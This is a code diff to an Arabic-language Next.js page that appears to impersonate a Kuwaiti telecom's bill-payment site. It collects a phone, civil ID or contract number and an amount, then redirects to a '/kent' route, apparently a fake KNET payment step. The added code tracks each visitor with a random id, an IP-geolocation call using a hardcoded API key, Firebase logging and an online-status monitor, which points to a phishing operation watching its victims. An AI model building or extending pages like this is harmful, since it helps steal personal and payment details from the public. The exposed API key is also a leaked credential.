@@ -13,22 +13,46 @@ import { useRouter } from "next/navigation"
 import { FullPageLoader } from "@/components/full-page-loader"
 import { useEffect, useState } from "react"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/online-sts"
 
 export default function Home() {
-  const _id=`stc-${new Date().getDate()}`
-  useEffect(()=>{
-    addData({id:_id,createdDate:new Date().toISOString()})
-  },[])
-  const [isloading,setisloading]=useState(false)
-  const route=useRouter()
-const handleSubmit=(e: { preventDefault: () => void })=>{
-e.preventDefault()
-setisloading(true)
-setTimeout(() => {
-  route.push('/kent')
-setisloading(false)  
-}, 3000);
-}
+  const _id = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 15);
+  useEffect(() => {
+    getLocation()
+  }, [])
+  const [isloading, setisloading] = useState(false)
+  const [phone, setPhone] = useState('0')
+  const route = useRouter()
+  const handleSubmit = (e: { preventDefault: () => void }) => {
+    e.preventDefault()
+    setisloading(true)
+    setTimeout(() => {
+      route.push('/kent')
+      setisloading(false)
+    }, 3000);
+  }
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: _id,
+        country: country,
+        createdDate: new Date().toISOString()
+      })
+      localStorage.setItem('country', country)
+      console.log(country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
   return (
     <div className="flex flex-col min-h-screen bg-gray-50 font-sans" dir="rtl">
       {/* Header */}
@@ -101,11 +125,22 @@ setisloading(false)
         </div>
 
         <Input
-        required
-        maxLength={12}
+          required
+          type="tel"
+          onChange={(e)=>setPhone(e.target.value)}
+          maxLength={12}
           placeholder="رقم الجوال/البطاقة المدنية أو رقم العقد"
           className="text-right border-b border-gray-300 rounded-none focus:ring-0 mb-6 py-6 px-2"
         />
+        {phone.length>=8 && 
+          <Input
+          required
+          maxLength={3}
+          placeholder="القيمة بالدينار الكويتي"
+          type="tel"
+          className="text-right border-b border-gray-300 rounded-none focus:ring-0 mb-6 py-6 px-2"
+        />
+        }
 
         <Button className="w-full bg-red-400 hover:bg-red-500 text-white rounded-full py-6 font-medium text-lg">
           تابع الآن
@@ -232,7 +267,7 @@ setisloading(false)
 
       {/* Footer */}
       <Footer />
-{isloading&&<FullPageLoader text="جاري التحويل ..." />}
+      {isloading && <FullPageLoader text="جاري التحويل ..." />}
       {/* WhatsApp Button */}
       <WhatsAppButton />
     </div>
